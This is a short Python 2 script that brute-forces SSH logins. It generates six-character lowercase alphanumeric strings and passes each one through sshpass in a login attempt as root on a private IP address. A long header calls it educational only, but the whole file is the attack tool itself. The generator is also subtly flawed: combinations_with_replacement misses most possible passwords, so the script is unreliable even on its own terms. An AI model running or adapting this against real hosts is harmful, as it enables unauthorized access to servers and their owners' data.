#!/usr/bin/python

##################################################################################################
#
# This code is provided to you for educational purposes only by Andrew Malone 
# 
# used to demonstrate how a brute-force attack against an SSH host MIGHT look
# this is for EDUCATIONAL Purposes ONLY I cannot stress that enough.
# I do not take any responsibility for how anyone uses this code nor do I endorse any illegal uses of this code
# this code block is to demonstrate how easily a password authentication based SSH server could be and most often is vulnerable
# in the hope that anyone viewing this would take it to heart and strengthen there hosts security.
# 
#
##################################################################################################
import itertools
import subprocess

characters = '0123456789abcdefghijklmnopqrstuvwxyz'
password_length = 6
## python Brute-force Gen ##
gen = itertools.combinations_with_replacement(characters,password_length) #1
for password in gen:                                                      #2 
	## sshpass -p password ssh username@server.example.com ##
	print password
	print "".join(map(str,password))

	subprocess.call(["sshpass","-p","".join(map(str,password)),"ssh","root@192.168.10.11"]) ## Send password to remote host and check login
    #check_password(password)